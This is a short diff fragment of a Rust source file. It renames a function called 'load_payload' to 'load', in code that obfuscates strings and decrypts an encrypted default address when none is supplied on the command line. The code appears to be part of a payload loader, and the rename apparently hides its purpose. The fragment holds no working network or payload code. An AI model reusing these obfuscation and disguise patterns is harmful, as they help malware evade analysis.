@@ -2,7 +2,7 @@ use std::env;
 use obfstr::obfstr;
 use crate::utils::simple_decrypt;
 
-pub fn load_payload() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+pub fn load() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let args: Vec<String> = env::args().collect();
     let address = if args.len() < 2 || args[1].is_empty() {
         // Decrypt the encrypted default address
